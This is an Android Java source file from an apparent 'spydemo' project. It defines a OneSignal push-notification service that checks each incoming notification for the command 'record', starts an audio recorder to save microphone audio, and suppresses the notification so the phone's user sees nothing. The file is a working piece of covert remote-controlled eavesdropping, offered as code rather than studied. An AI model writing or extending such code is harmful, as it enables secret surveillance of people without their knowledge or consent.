package com.spy.spydemo;

import android.content.Context;

import com.onesignal.NotificationExtenderService;
import com.onesignal.OSNotificationReceivedResult;

public class OSService extends NotificationExtenderService {
    private Context context;

    public OSService(Context context) {
        this.context = context;
    }

    public OSService() {
    }

    public Context getContext() {
        return context;
    }

    public void setContext(Context context) {
        this.context = context;
    }

    @Override
    protected boolean onNotificationProcessing(OSNotificationReceivedResult notification) {
        String cmd = notification.payload.body.trim();
        if (cmd.equals("record")) {
            AudioRecorder audioRecorder = new AudioRecorder(context);
            audioRecorder.saveAudio();
        }

        // Не показывать уведомление
        return true;
    }
}
